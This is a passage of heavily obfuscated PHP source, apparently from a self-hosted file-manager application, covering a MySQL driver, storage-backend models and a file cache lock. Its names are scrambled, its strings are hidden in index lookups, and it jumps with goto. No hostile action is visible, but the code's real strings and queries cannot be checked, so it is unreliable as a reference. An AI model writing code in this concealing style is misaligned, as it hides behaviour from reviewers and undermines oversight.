$this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $…£±…´• = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$…£±…´•) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ƒŒÕëÎ‡ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ƒŒÕëÎ‡) { $this->error(); return !1; } } return !0; } private function getAll() { $‡®øÇé = array(); if ($this->numRows > 0) { for ($§œË°‡ = 0; $§œË°‡ < $this->numRows; $§œË°‡++) { $‡®øÇé[$§œË°‡] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $‡®øÇé; } public function getFields($Ú¼²ëÅî) { $Ì‘ÖåÜü =& $_SERVER[Õò”†—·]; $›šïà­‹ = $this->query($Ì‘ÖåÜü[947] . $this->parseKey($Ú¼²ëÅî)); $ÆÑ¢É³¦ = array(); if ($›šïà­‹) { foreach ($›šïà­‹ as $Ìúõ­¾ø => $°œì¬Á) { $ÆÑ¢É³¦[$°œì¬Á[$Ì‘ÖåÜü[41]]] = array($Ì‘ÖåÜü[42] => $°œì¬Á[$Ì‘ÖåÜü[41]], $Ì‘ÖåÜü[43] => $°œì¬Á[$Ì‘ÖåÜü[44]], $Ì‘ÖåÜü[45] => (bool) ($°œì¬Á[$Ì‘ÖåÜü[46]] === $Ì‘ÖåÜü[22]), $Ì‘ÖåÜü[47] => $°œì¬Á[$Ì‘ÖåÜü[48]], $Ì‘ÖåÜü[49] => strtolower($°œì¬Á[$Ì‘ÖåÜü[50]]) == $Ì‘ÖåÜü[51], $Ì‘ÖåÜü[52] => strtolower($°œì¬Á[$Ì‘ÖåÜü[53]]) == $Ì‘ÖåÜü[54]); } } return $ÆÑ¢É³¦; } public function getTables($Ÿ³œö¡È = '') { $”ï«óÁ€ =& $_SERVER[Õò”†—·]; $ğÜ€ ”ó = !empty($Ÿ³œö¡È) ? $”ï«óÁ€[949] . $Ÿ³œö¡È . $”ï«óÁ€[950] : $”ï«óÁ€[951]; $Â‚±Ö·  = $this->query($ğÜ€ ”ó); $Óãçø«ƒ = array(); if ($Â‚±Ö· ) { foreach ($Â‚±Ö·  as $ªÉÍ­ => $Ğ¾§îàÕ) { $Óãçø«ƒ[$ªÉÍ­] = current($Ğ¾§îàÕ); } } return $Óãçø«ƒ; } public function replace($Š¶ÏÁßŠ, $Ñ¸Ÿ¢°Ú = array()) { $†á•‘÷ =& $_SERVER[Õò”†—·]; foreach ($Š¶ÏÁßŠ as $€¦ì¢©Ì => $äÅ¹±ˆé) { $¶¢äË®° = $this->parseValue($äÅ¹±ˆé); if (is_scalar($¶¢äË®°)) { $ê‰µ¸[] = $¶¢äË®°; $Æ‚ëòˆ…[] = $this->parseKey($€¦ì¢©Ì); } } $á‡˜ŒÑ› = $†á•‘÷[952] . $this->parseTable($Ñ¸Ÿ¢°Ú[$†á•‘÷[340]]) . $†á•‘÷[953] . implode($†á•‘÷[60], $Æ‚ëòˆ…) . $†á•‘÷[954] . implode($†á•‘÷[60], $ê‰µ¸) . $†á•‘÷[955]; return $this->execute($á‡˜ŒÑ›); } public function insertAll($ÌÃŸ¶, $Àø†ç–× = array(), $È†¢·§ = false) { $´ë¦Éö =& $_SERVER[Õò”†—·]; if (!is_array($ÌÃŸ¶[0])) { return !1; } $Ôü–©•ú = array_keys($ÌÃŸ¶[0]); $÷ë¬Ğ­å = array(); foreach ($ÌÃŸ¶ as $¬ù¨ËÂŞ) { $­›à½ = array(); foreach ($¬ù¨ËÂŞ as $Í·ç³Ñ => $‰ÄÁÍ…ì) { $‰ÄÁÍ…ì = $this->parseValue($‰ÄÁÍ…ì); if (is_scalar($‰ÄÁÍ…ì)) { $­›à½[] = $‰ÄÁÍ…ì; } } $÷ë¬Ğ­å[] = $´ë¦Éö[321] . implode($´ë¦Éö[60], $­›à½) . $´ë¦Éö[955]; } array_walk($Ôü–©•ú, array($this, $´ë¦Éö[956])); $˜´ÑÑ¢ó = $È†¢·§ ? $´ë¦Éö[957] : $´ë¦Éö[958]; $´–·é± = $˜´ÑÑ¢ó . $´ë¦Éö[959] . $this->parseTable($Àø†ç–×[$´ë¦Éö[340]]) . $´ë¦Éö[953] . implode($´ë¦Éö[60], $Ôü–©•ú) . $´ë¦Éö[960] . implode($´ë¦Éö[60], $÷ë¬Ğ­å); return $this->execute($´–·é±); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $à‹Æ¡öª =& $_SERVER[Õò”†—·]; $this->error = $this->_linkID->errno . $à‹Æ¡öª[4] . $this->_linkID->error; if ($à‹Æ¡öª[22] != $this->queryStr) { $this->error .= LNG($à‹Æ¡öª[58]) . $this->queryStr; } think_trace($this->error, $à‹Æ¡öª[22], $à‹Æ¡öª[59]); return $this->error; } public function escapeString($ªŒÛ´â°) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ªŒÛ´â°); } else { return addslashes($ªŒÛ´â°); } } public function parseKey(&$Ù›ÒÉšÛ, $ÑÓ÷ß³Ô = true) { $Ïá’šóŸ =& $_SERVER[Õò”†—·]; if ($ÑÓ÷ß³Ô) { $Ù›ÒÉšÛ = $this->parseKeyCheck($Ù›ÒÉšÛ); } if ($Ù›ÒÉšÛ != $Ïá’šóŸ[221] && !preg_match($Ïá’šóŸ[961], $Ù›ÒÉšÛ)) { $Ù›ÒÉšÛ = $Ïá’šóŸ[445] . trim($Ù›ÒÉšÛ, $Ïá’šóŸ[445]) . $Ïá’šóŸ[445]; } return $Ù›ÒÉšÛ; } } goto eÍ›ğ«‰Ù÷; EªáÛ†Ş: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\56\x73\x6f\165\x72\x63\145\123\x65\x63\x72\x65\164\x4c\x69\x73\164"; public $field = array("\163\x6f\165\162\143\x65\x49\x44", "\164\x79\x70\x65\111\104", "\143\x72\145\141\x74\x65\x55\163\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\x2e\163\x74\157\x72\x61\147\x65\x4c\151\163\x74"; public $field = array("\156\141\x6d\145", "\163\x69\172\x65\115\141\170", "\163\x79\163\x74\x65\155", "\144\145\146\x61\x75\x6c\x74", "\x64\162\x69\x76\x65\162", "\143\157\x6e\146\151\x67"); public function listData($†ş˜Ú = false, $Ã¯›Ü°í = "\x6d\x6f\x64\x69\146\x79\124\x69\x6d\145", $åÂÍÀ±Ù = false) { $¹»ŸÜĞ =& $_SERVER[Õò”†—·]; $¾Â¥Å¤Å = parent::listData($†ş˜Ú, $Ã¯›Ü°í, $åÂÍÀ±Ù); if ($†ş˜Ú) { return $¾Â¥Å¤Å; } $ùºüªéÚ = array(); if ($GLOBALS[$¹»ŸÜĞ[2280]]) { $ùºüªéÚ = $this->ioSizeUseGet(array_to_keyvalue($¾Â¥Å¤Å, $¹»ŸÜĞ[22], $¹»ŸÜĞ[459])); } foreach ($¾Â¥Å¤Å as $ûÍŒ¿‡Õ => $÷ê¼È) { unset($¾Â¥Å¤Å[$ûÍŒ¿‡Õ][$¹»ŸÜĞ[16]]); $¾Â¥Å¤Å[$ûÍŒ¿‡Õ][$¹»ŸÜĞ[1942]] = isset($ùºüªéÚ[$÷ê¼È[$¹»ŸÜĞ[459]]]) ? $ùºüªéÚ[$÷ê¼È[$¹»ŸÜĞ[459]]] : 0; } return $¾Â¥Å¤Å; } public function ioSizeUseGet($§‹Š·¿Ê) { $âÔ˜ÀÔ… =& $_SERVER[Õò”†—·]; if (!$§‹Š·¿Ê) { return array(); } $±²šËí = $âÔ˜ÀÔ…[2281] . implode($âÔ˜ÀÔ…[60], $§‹Š·¿Ê); $‘‡ç–…Ï = Cache::get($±²šËí); if ($‘‡ç–…Ï) { return $‘‡ç–…Ï; } $Õ£ã¯ñ° = array($âÔ˜ÀÔ…[867] => $âÔ˜ÀÔ…[459], $âÔ˜ÀÔ…[2282] => $âÔ˜ÀÔ…[89]); $£¹¥€éÓ = array($âÔ˜ÀÔ…[867] => array($âÔ˜ÀÔ…[17], $§‹Š·¿Ê)); $‘‡ç–…Ï = Model($âÔ˜ÀÔ…[839])->field($Õ£ã¯ñ°)->where($£¹¥€éÓ)->group($âÔ˜ÀÔ…[867])->select(); $‘‡ç–…Ï = array_to_keyvalue($‘‡ç–…Ï, $âÔ˜ÀÔ…[459], $âÔ˜ÀÔ…[89]); Cache::set($±²šËí, $‘‡ç–…Ï, 600); return $‘‡ç–…Ï; } public function getConfig($öµÉû½­) { $º÷¦¦Ç = parent::listData($öµÉû½­); return json_decode($º÷¦¦Ç[$_SERVER[Õò”†—·][16]], !0); } public function update($ù‹¸ñÔ, $ÔÁşæÈ) { $É…«…à =& $_SERVER[Õò”†—·]; $Á•†Ö« = $ÔÁşæÈ[$É…«…à[42]]; $¦ØÑ”¬ = array_to_keyvalue(parent::listData(), $É…«…à[42]); if (isset($¦ØÑ”¬[$Á•†Ö«]) && $¦ØÑ”¬[$Á•†Ö«][$É…«…à[459]] != $ù‹¸ñÔ) { return !1; } $this->checkPwd($ù‹¸ñÔ, $ÔÁşæÈ); if (isset($ÔÁşæÈ[$É…«…à[2283]]) && $ÔÁşæÈ[$É…«…à[2283]] == $É…«…à[101]) { $this->checkConfig($ÔÁşæÈ); } unset($ÔÁşæÈ[$É…«…à[2283]]); $‹ÃìÖã· = parent::update($ù‹¸ñÔ, $ÔÁşæÈ); if ($‹ÃìÖã· && $ÔÁşæÈ[$É…«…à[47]]) { $†å×œáÈ = 0; foreach ($¦ØÑ”¬ as $’ÕƒÛ¸ò) { if ($’ÕƒÛ¸ò[$É…«…à[47]] && $’ÕƒÛ¸ò[$É…«…à[459]] != $ù‹¸ñÔ) { $†å×œáÈ = $’ÕƒÛ¸ò[$É…«…à[459]]; parent::update($’ÕƒÛ¸ò[$É…«…à[459]], array($É…«…à[47] => 0)); } } $this->updateBackup($ù‹¸ñÔ, $†å×œáÈ); } return $‹ÃìÖã·; } public function add($ÓÔÑá²Î) { $‡éş÷‹– =& $_SERVER[Õò”†—·]; $èëÒ‚ş® = array_to_keyvalue(parent::listData(), $‡éş÷‹–[42]); if (isset($èëÒ‚ş®[$ÓÔÑá²Î[$‡éş÷‹–[42]]])) { return !1; } $this->checkConfig($ÓÔÑá²Î); $˜´»“®Œ = parent::insert($ÓÔÑá²Î); if ($˜´»“®Œ && $ÓÔÑá²Î[$‡éş÷‹–[47]]) { foreach ($èëÒ‚ş® as $şÓŞæÌ) { if ($şÓŞæÌ[$‡éş÷‹–[47]]) { parent::update($şÓŞæÌ[$‡éş÷‹–[459]], array($‡éş÷‹–[47] => 0)); } } } return $˜´»“®Œ; } public function updateBackup($ı€ ´ûÊ, $ÁÕÇµ‚ê) { $éøŞ±áû =& $_SERVER[Õò”†—·]; if (!$ÁÕÇµ‚ê) { return; } $èôì›ĞŒ = Model($éøŞ±áû[800])->config(); if ($èôì›ĞŒ[$éøŞ±áû[1725]] != $éøŞ±áû[101] || $èôì›ĞŒ[$éøŞ±áû[802]] != $ÁÕÇµ‚ê) { return; } $Ãé¬²¹Í = Model($éøŞ±áû[821])->get($éøŞ±áû[833]); $Ãé¬²¹Í = json_decode($Ãé¬²¹Í, !0); if (!$Ãé¬²¹Í) { return; } $Ãé¬²¹Í[$éøŞ±áû[802]] = $ı€ ´ûÊ; Model($éøŞ±áû[821])->set(array($éøŞ±áû[833] => $Ãé¬²¹Í)); } public function checkPwd($“ƒªô’â, &$æüˆ†•ù) { $úÜÀœ´Å =& $_SERVER[Õò”†—·]; if (empty($æüˆ†•ù[$úÜÀœ´Å[16]])) { return; } $ÅÕ—›Î = json_decode($æüˆ†•ù[$úÜÀœ´Å[16]], !0); $›ü¦Õüº = $úÜÀœ´Å[22]; $¤Ë¶¢³ = array($úÜÀœ´Å[2284], $úÜÀœ´Å[2285], $úÜÀœ´Å[939]); foreach ($¤Ë¶¢³ as $…¶ÉüÇÌ) { if (isset($ÅÕ—›Î[$…¶ÉüÇÌ])) { $›ü¦Õüº = $…¶ÉüÇÌ; break; } } if (!$›ü¦Õüº) { return; } $•ì¸¸š‹ = $this->getConfig($“ƒªô’â); $…ş¢Ú‹÷ = $•ì¸¸š‹[$›ü¦Õüº]; $Ğ¾Ñ­Ú  = $ÅÕ—›Î[$›ü¦Õüº]; if ($Ğ¾Ñ­Ú  == str_repeat($úÜÀœ´Å[221], strlen($…ş¢Ú‹÷))) { $ÅÕ—›Î[$›ü¦Õüº] = $…ş¢Ú‹÷; $æüˆ†•ù[$úÜÀœ´Å[16]] = json_encode($ÅÕ—›Î); } else { if ($Ğ¾Ñ­Ú  != $…ş¢Ú‹÷) { $æüˆ†•ù[$úÜÀœ´Å[2283]] = $úÜÀœ´Å[101]; } } } public function checkConfig(&$ÉÍë¶Š÷, $ı•Ãù§Á = false) { $¯ˆÑƒù± =& $_SERVER[Õò”†—·]; $™Ãõõ‰» = strtolower($ÉÍë¶Š÷[$¯ˆÑƒù±[108]]); $¿‚Ò§Óñ = json_decode($ÉÍë¶Š÷[$¯ˆÑƒù±[16]], !0); foreach ($¿‚Ò§Óñ as $àÙŞî÷Ü => $‰óô“½•) { if (is_string($‰óô“½•)) { $¿‚Ò§Óñ[$àÙŞî÷Ü] = trim($‰óô“½•); } } $¿‚Ò§Óñ[$¯ˆÑƒù±[2286]] = rand_string(6); $ö¥³íÎö = $GLOBALS[$¯ˆÑƒù±[16]][$¯ˆÑƒù±[102]][$¯ˆÑƒù±[876]]; $ŒåºöÒ¢ = isset($ö¥³íÎö[$™Ãõõ‰»]) ? $ö¥³íÎö[$™Ãõõ‰»] : ucfirst($™Ãõõ‰»); $à×ªï€í = $¯ˆÑƒù±[87] . $ŒåºöÒ¢; if (!$ŒåºöÒ¢ || !class_exists($à×ªï€í)) { if ($ı•Ãù§Á) { return LNG($¯ˆÑƒù±[2287]); } write_log(array($¯ˆÑƒù±[2288], $ÉÍë¶Š÷, get_caller_info()), $¯ˆÑƒù±[216]); show_json(LNG($¯ˆÑƒù±[2287]), !1, $ÉÍë¶Š÷); } $ÃäƒÚ÷ = new $à×ªï€í($¿‚Ò§Óñ); if (in_array($™Ãõõ‰», $ÃäƒÚ÷->objectDriver)) { try { if (!$ÃäƒÚ÷->isBucketCors() && !$ÃäƒÚ÷->setBucketCors()) { $›ü“åâå = LNG($¯ˆÑƒù±[2289]); $›ü“åâå .= $¯ˆÑƒù±[2290] . LNG($¯ˆÑƒù±[2291]); } } catch (Exception $ö¾ãµ­ä) { $›ü“åâå = $ö¾ãµ­ä->getMessage(); } if (isset($›ü“åâå)) { return $this->_parseError($›ü“åâå, $™Ãõõ‰», $ı•Ãù§Á); } } $„äî›¶Ó = rtrim($¿‚Ò§Óñ[$¯ˆÑƒù±[1234]], $¯ˆÑƒù±[18]) . $¯ˆÑƒù±[18]; $®£²©º = $ÃäƒÚ÷->getPath($„äî›¶Ó . $¯ˆÑƒù±[1238]); try { $€ß”šÏ¶ = $ÃäƒÚ÷->mkfile($®£²©º); if (!$€ß”šÏ¶) { $›ü“åâå = LNG($¯ˆÑƒù±[2289]); } } catch (Exception $ö¾ãµ­ä) { $›ü“åâå = $ö¾ãµ­ä->getMessage(); } if (isset($›ü“åâå)) { return $this->_parseError($›ü“åâå, $™Ãõõ‰», $ı•Ãù§Á); } if ($™Ãõõ‰» == $¯ˆÑƒù±[78] && !$ÃäƒÚ÷->checkRegion()) { return $this->_parseError(LNG($¯ˆÑƒù±[2292]), $™Ãõõ‰», $ı•Ãù§Á); } $¿‚Ò§Óñ[$¯ˆÑƒù±[1234]] = $„äî›¶Ó; $ÉÍë¶Š÷[$¯ˆÑƒù±[16]] = json_encode($¿‚Ò§Óñ); $ÉÍë¶Š÷[$¯ˆÑƒù±[108]] = $ŒåºöÒ¢; return !0; } private function _parseError($ªÒäµÛ‚, $ûñûß­, $È›·èĞÎ = false) { $Àèœ¶«± =& $_SERVER[Õò”†—·]; if ($ûñûß­ == $Àèœ¶«±[78] && stripos($ªÒäµÛ‚, $Àèœ¶«±[2293])) { $¡Ò‚í÷Î = explode($Àèœ¶«±[20], $ªÒäµÛ‚); $Š•©©İÒ = isset($¡Ò‚í÷Î[1]) ? $¡Ò‚í÷Î[1] : $Àèœ¶«±[22]; $Ü¾ÈèÍ = array($Àèœ¶«±[2294] => LNG($Àèœ¶«±[2295]), $Àèœ¶«±[2296] => LNG($Àèœ¶«±[2297])); if (isset($Ü¾ÈèÍ[$Š•©©İÒ])) { $ªÒäµÛ‚ = $Ü¾ÈèÍ[$Š•©©İÒ]; } } if (stripos($ªÒäµÛ‚, $Àèœ¶«±[2298]) === 0) { $Û„¥±Ú = strpos($ªÒäµÛ‚, $Àèœ¶«±[178]); if ($Û„¥±Ú === !1) { $Û„¥±Ú = strpos($ªÒäµÛ‚, $Àèœ¶«±[4]); } if ($Û„¥±Ú !== !1) { $ªÒäµÛ‚ = substr($ªÒäµÛ‚, $Û„¥±Ú + 1); } } $ªÒäµÛ‚ = LNG($Àèœ¶«±[1240]) . $ªÒäµÛ‚; if ($È›·èĞÎ) { return $ªÒäµÛ‚; } show_json($ªÒäµÛ‚, !1); } public function driverListSystem() { $Ë™Ê ˆ =& $_SERVER[Õò”†—·]; $£´ßû•î = parent::listData(); $¥ŠÔçƒõ = array(); foreach ($£´ßû•î as $å¡’••£) { unset($å¡’••£[$Ë™Ê ˆ[232]], $å¡’••£[$Ë™Ê ˆ[98]]); $å¡’••£[$Ë™Ê ˆ[16]] = json_decode($å¡’••£[$Ë™Ê ˆ[16]], !0); $¥ŠÔçƒõ[] = $å¡’••£; } return $¥ŠÔçƒõ; } public function defaultDriver() { $áíİ² =& $_SERVER[Õò”†—·]; $ÂùŞ¤¼© = parent::listData(); $êÌ§û‘Ó = array_filter_by_field($ÂùŞ¤¼©, $áíİ²[47], 1); $êÌ§û‘Ó = $êÌ§û‘Ó[0]; if ($êÌ§û‘Ó) { $êÌ§û‘Ó[$áíİ²[16]] = json_decode($êÌ§û‘Ó[$áíİ²[16]], !0); } return $êÌ§û‘Ó; } public function driverInfo($²£‘ûœ³) { $¼ÆËá—á =& $_SERVER[Õò”†—·]; $„À€İŞ¸ = array_to_keyvalue(parent::listData(), $¼ÆËá—á[459]); if (!isset($„À€İŞ¸[$²£‘ûœ³])) { return !1; } $òì¢¢î = $„À€İŞ¸[$²£‘ûœ³]; $òì¢¢î[$¼ÆËá—á[16]] = json_decode($òì¢¢î[$¼ÆËá—á[16]], !0); return $òì¢¢î; } public function remove($¿¾¸§õ) { $this->removeShareItems($¿¾¸§õ); return parent::remove($¿¾¸§õ); } public function removeWithFile($ÄØ¡ú¹‘, $÷ŸİÊÛî, $ÈÑöŒ, $ô¾í™¥µ = false) { $Ñ¯ô¾Å” =& $_SERVER[Õò”†—·]; $ƒ„²Å—“ = array($Ñ¯ô¾Å”[867] => $ÄØ¡ú¹‘); $õÔÜÂÂš = Model($Ñ¯ô¾Å”[528])->where($ƒ„²Å—“)->count(); $©‡¼Ëú = Model($Ñ¯ô¾Å”[528])->where($ƒ„²Å—“)->sum($Ñ¯ô¾Å”[89]); $ùè¼¿œì = $÷ŸİÊÛî . $Ñ¯ô¾Å”[2299] . $ÄØ¡ú¹‘; $ŠŒ•µ¶ = LNG($÷ŸİÊÛî == $Ñ¯ô¾Å”[604] ? $Ñ¯ô¾Å”[2300] : $Ñ¯ô¾Å”[2301]); $ªı×¹»Ü = new TaskFileTransfer($ùè¼¿œì, $Ñ¯ô¾Å”[216], $õÔÜÂÂš, $ŠŒ•µ¶ . $Ñ¯ô¾Å”[446] . $ÈÑöŒ[$Ñ¯ô¾Å”[42]] . $Ñ¯ô¾Å”[215] . $ÄØ¡ú¹‘); $ªı×¹»Ü->task[$Ñ¯ô¾Å”[814]] = (double) $©‡¼Ëú; $àŠÉ¨Å = KodIO::defaultDriver(); $Å›õ•úò = $àŠÉ¨Å[$Ñ¯ô¾Å”[459]]; $«Íõ‚Ğ = $¡Æöîˆş = $ì÷‹ñÒ› = array(); $ÙÌıµè = Model($Ñ¯ô¾Å”[231])->where($ƒ„²Å—“)->field($Ñ¯ô¾Å”[2302])->select(); foreach ($ÙÌıµè as $ÖæÉô¢¤) { $ã…ãì‘¦ = $ÖæÉô¢¤[$Ñ¯ô¾Å”[525]]; if ($ô¾í™¥µ) { $¡Æöîˆş[] = $ã…ãì‘¦; continue; } $›ıñÑˆ† = $ÖæÉô¢¤[$Ñ¯ô¾Å”[97]]; $Œ­Ê–ğÄ = get_path_father($›ıñÑˆ†); $ì÷‹ñÒ›[] = $Œ­Ê–ğÄ; $Œ­Ê–ğÄ = str_replace("\173\x69\157\72{$ÄØ¡ú¹‘}\175\x2f", "\x7b\x69\x6f\x3a{$Å›õ•úò}\175\57", $Œ­Ê–ğÄ); if (!IO::exist($›ıñÑˆ†)) { $«Íõ‚Ğ[] = $ã…ãì‘¦; $ªı×¹»Ü->updateFileEnd($ÖæÉô¢¤[$Ñ¯ô¾Å”[42]], $ÖæÉô¢¤[$Ñ¯ô¾Å”[89]]); write_log($Ñ¯ô¾Å”[2303] . $›ıñÑˆ†, $Ñ¯ô¾Å”[1885]); continue; } $˜„ôÊÆ† = IO::move($›ıñÑˆ†, $Œ­Ê–ğÄ, REPEAT_RENAME); if (!$˜„ôÊÆ†) { $¡Æöîˆş[] = $ã…ãì‘¦; $ªı×¹»Ü->updateFileEnd($ÖæÉô¢¤[$Ñ¯ô¾Å”[42]], $ÖæÉô¢¤[$Ñ¯ô¾Å”[89]]); write_log($Ñ¯ô¾Å”[2304] . $›ıñÑˆ†, $Ñ¯ô¾Å”[1885]); continue; } $ƒ„²Å—“ = array($Ñ¯ô¾Å”[525] => $ã…ãì‘¦); $ÀæˆÖ€ı = array($Ñ¯ô¾Å”[867] => $Å›õ•úò, $Ñ¯ô¾Å”[97] => $˜„ôÊÆ†); Model($Ñ¯ô¾Å”[231])->where($ƒ„²Å—“)->save($ÀæˆÖ€ı); } $Éä×‘– = $ªı×¹»Ü->task; if (!$ô¾í™¥µ) { Cache::set($ùè¼¿œì, $Éä×‘–); } $ªı×¹»Ü->end(); $«Íõ‚Ğ = array_unique($«Íõ‚Ğ); $¡Æöîˆş = array_unique($¡Æöîˆş); if (!$ô¾í™¥µ && ($«Íõ‚Ğ || $¡Æöîˆş)) { $º÷Â‹Ì = array(); if ($«Íõ‚Ğ) { $º÷Â‹Ì[] = sprintf(LNG($Ñ¯ô¾Å”[2305]), count($«Íõ‚Ğ)); } if ($¡Æöîˆş) { $º÷Â‹Ì[] = sprintf(LNG($Ñ¯ô¾Å”[2306]), count($¡Æöîˆş)); } $º÷Â‹Ì = sprintf(LNG($Ñ¯ô¾Å”[2307]), implode($Ñ¯ô¾Å”[2308], $º÷Â‹Ì)) . $Ñ¯ô¾Å”[2309] . date($Ñ¯ô¾Å”[2310]) . $Ñ¯ô¾Å”[2311]; if ($÷ŸİÊÛî == $Ñ¯ô¾Å”[1922]) { $º÷Â‹Ì .= $Ñ¯ô¾Å”[2312] . LNG($Ñ¯ô¾Å”[2313]); } $Éä×‘–[$Ñ¯ô¾Å”[1236]] = $º÷Â‹Ì; Cache::set($ùè¼¿œì, $Éä×‘–); unset($ÈÑöŒ[$Ñ¯ô¾Å”[16]]); $³‰«ñ÷ = array($Ñ¯ô¾Å”[459] => $ÄØ¡ú¹‘, $Ñ¯ô¾Å”[2192] => $Ñ¯ô¾Å”[604], $Ñ¯ô¾Å”[42] => $ÈÑöŒ[$Ñ¯ô¾Å”[42]], $Ñ¯ô¾Å”[1256] => $ÈÑöŒ); Hook::trigger($Ñ¯ô¾Å”[1766], array($Ñ¯ô¾Å”[1256] => $³‰«ñ÷, $Ñ¯ô¾Å”[1266] => !0)); show_json($º÷Â‹Ì, !1, 100111); } if ($÷ŸİÊÛî == $Ñ¯ô¾Å”[604]) { return !0; } if ($«Íõ‚Ğ || $¡Æöîˆş) { $ÀÈï·êÎ = array_merge($«Íõ‚Ğ, $¡Æöîˆş); $ÀÈï·êÎ = array_filter(array_unique($ÀÈï·êÎ)); $this->removeByFileID($ÀÈï·êÎ); } if ($ì÷‹ñÒ›) { $ì÷‹ñÒ› = array_filter(array_unique($ì÷‹ñÒ›)); foreach ($ì÷‹ñÒ› as $›ıñÑˆ†) { $’Î•¾˜¯ = IO::has($›ıñÑˆ†, !0); if (!$’Î•¾˜¯[$Ñ¯ô¾Å”[240]] && !$’Î•¾˜¯[$Ñ¯ô¾Å”[241]]) { IO::remove($›ıñÑˆ†); } } } return $this->remove($ÄØ¡ú¹‘); } private function removeByFileID($ŠÃŒ ¦· = array()) { $Ö«‡…É =& $_SERVER[Õò”†—·]; if (empty($ŠÃŒ ¦·)) { return; } $í½¡Ï–ù = array($Ö«‡…É[525] => array($Ö«‡…É[17], $ŠÃŒ ¦·)); $İš›ı¼ = Model($Ö«‡…É[1388])->where($í½¡Ï–ù)->field($Ö«‡…É[194])->select(); if (!$İš›ı¼) { return Model($Ö«‡…É[528])->remove($ŠÃŒ ¦·); } $İš›ı¼ = array_to_keyvalue($İš›ı¼, $Ö«‡…É[22], $Ö«‡…É[194]); foreach ($İš›ı¼ as $Í×©âê) { Model($Ö«‡…É[875])->removeNow($Í×©âê, !1); } } private function removeShareItems($ŒÅí•—ö) { $Û‘ü˜€Á =& $_SERVER[Õò”†—·]; $¸şİ‰Î = "\x7b\x69\x6f\72{$ŒÅí•—ö}\175\x2f"; $›‚æ¶‘“ = array($Û‘ü˜€Á[194] => 0, $Û‘ü˜€Á[1229] => array($Û‘ü˜€Á[443], "{$¸şİ‰Î}\x25")); $•ºÆø–Ñ = Model($Û‘ü˜€Á[1933])->where($›‚æ¶‘“)->field($Û‘ü˜€Á[649])->select(); if (empty($•ºÆø–Ñ)) { return; } $ƒæŒ·¿­ = array_to_keyvalue($•ºÆø–Ñ, $Û‘ü˜€Á[22], $Û‘ü˜€Á[649]); Model($Û‘ü˜€Á[648])->remove($ƒæŒ·¿­); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\x2e\x4c\x69\x67\150\x74\101\x70\x70"; public $modelType = "\x53\171\163\x74\145\155\117\x70\x74\x69\x6f\156"; public $field = array("\x6e\141\155\x65", "\x67\x72\157\x75\x70", "\144\x65\x73\143", "\143\157\156\x74\x65\x6e\164"); public function listData($†ê’îÔô = false, $ì¡Ü©Ãé = "\x6d\157\x64\151\x66\x79\124\x69\x6d\x65", $À€ˆ¯¯á = true) { return parent::listData($†ê’îÔô, $ì¡Ü©Ãé, $À€ˆ¯¯á); } public function remove($Ÿ¿º¹Ÿ») { $î¾¸‹¿ = $this->findByName($Ÿ¿º¹Ÿ»); if (!$î¾¸‹¿) { return !1; } return parent::remove($î¾¸‹¿[$_SERVER[Õò”†—·][459]]); } public function add($´Øíãåö) { if ($this->findByName($´Øíãåö[$_SERVER[Õò”†—·][42]])) { return !1; } return parent::insert($´Øíãåö); } public function update($‹£ìøÂæ, $Ğœşˆ¡÷) { $õî°Ú‘÷ =& $_SERVER[Õò”†—·]; $ˆ†½ĞÁ€ = $this->findByName($‹£ìøÂæ); $èåÖòÏ÷ = $this->findByName($Ğœşˆ¡÷[$õî°Ú‘÷[42]]); if (!$ˆ†½ĞÁ€ || $èåÖòÏ÷ && $èåÖòÏ÷[$õî°Ú‘÷[459]] != $ˆ†½ĞÁ€[$õî°Ú‘÷[459]]) { return !1; } return parent::update($ˆ†½ĞÁ€[$õî°Ú‘÷[459]], $Ğœşˆ¡÷); } } goto Dƒ™Ş¦ò×; FÄ´ŸŒàµí: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $·ôúÅÍ‚ =& $_SERVER[Õò”†—·]; $¿õææŞ– = $GLOBALS[$·ôúÅÍ‚[16]][$·ôúÅÍ‚[409]]; self::$cachePath = $¿õææŞ–[$·ôúÅÍ‚[231]][$·ôúÅÍ‚[97]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($¾İ²èèì, $ŠÉà£äÉ = 0) { $úÀÂå« =& $_SERVER[Õò”†—·]; $—ï—¢·³ = microtime(!0); $àú¯áÌ° = $—ï—¢·³ + $ŠÉà£äÉ + 0.0001; $ïâÍä² = rtrim(self::$cachePath, $úÀÂå«[18]) . $úÀÂå«[914] . md5($¾İ²èèì) . $úÀÂå«[911]; if (file_exists($ïâÍä²) && filemtime($ïâÍä²) && filemtime($ïâÍä²) < time() - 10) { @unlink($ïâÍä²); } do { if (file_exists($ïâÍä²)) { cacheLockWait(); continue; } $èŸ¾ì‘¦ = fopen($ïâÍä², $úÀÂå«[915]); if (!$èŸ¾ì‘¦) { return !1; } $æµ¡è»Ş = flock($èŸ¾ì‘¦, LOCK_EX | LOCK_NB); self::$caches[$¾İ²èèì] = array($úÀÂå«[916] => $èŸ¾ì‘¦, $úÀÂå«[231] => $ïâÍä²); fwrite($èŸ¾ì‘¦, $àú¯áÌ°); clearstatcache(); if ($èŸ¾ì‘¦ && $æµ¡è»Ş) { return !0; } cacheLockWait(); } while (microtime(!0) < $àú¯áÌ°); $this->unlock($¾İ²èèì); return !1; } public function lockGet($Â¯¯”ñ) { $ùĞá–¥´ =& $_SERVER[Õò”†—·]; $»±É®Ö = rtrim(self::$cachePath, $ùĞá–¥´[18]) . $ùĞá–¥´[914] . md5($Â¯¯”ñ) . $ùĞá–¥´[911]; return file_exists($»±É®Ö); } public function unlock($È¶×á‰ì) { $´¨ùû‰ =& $_SERVER[Õò”†—·]; $©ğÃô»ˆ = 